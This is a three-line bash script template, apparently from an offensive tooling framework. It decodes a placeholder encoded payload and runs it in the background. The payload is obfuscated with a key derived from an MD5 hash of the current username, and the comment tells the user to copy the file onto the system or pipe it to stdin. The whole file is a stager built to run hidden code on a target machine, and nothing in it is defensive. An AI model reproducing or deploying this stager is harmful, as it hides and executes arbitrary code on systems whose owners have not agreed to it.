#!/usr/bin/env bash
#Copy this file to the system or pipe straight to stdin
echo {{ENCODED_PAYLOAD}} | sed 's/'$(whoami | openssl md5 | cut -c1-7)'//' | base64 --decode | bash &
